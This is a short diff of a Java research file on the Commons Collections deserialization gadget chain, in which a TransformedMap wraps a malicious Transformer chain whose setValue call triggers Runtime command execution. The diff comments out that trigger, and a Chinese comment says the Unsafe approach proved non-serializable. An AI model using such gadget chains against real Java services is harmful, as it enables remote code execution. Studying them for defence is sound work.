@@ -46,14 +46,14 @@ public class UnsafeChainTrans {
         // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
         Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
 
-//         transformedMap.put("v1", "v2");// 执行put也会触发transform
+        // transformedMap.put("v1", "v2");// 执行put也会触发transform
 
         // 遍历Map元素，并调用setValue方法
         for (Object obj : transformedMap.entrySet()) {
             Map.Entry entry = (Map.Entry) obj;
 
             // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
-            entry.setValue("test");
+//            entry.setValue("test");
         }
 //        try {
 //            // 获取AnnotationInvocationHandler类对象
@@ -100,7 +100,7 @@ public class UnsafeChainTrans {
 //        } catch (Exception e) {
 //            e.printStackTrace();
 //        }
-//        //写到最后才发现Unsafe不能被反序列化......当研究算了
+        //写到最后才发现Unsafe不能被反序列化......当研究算了
     }
 
 }
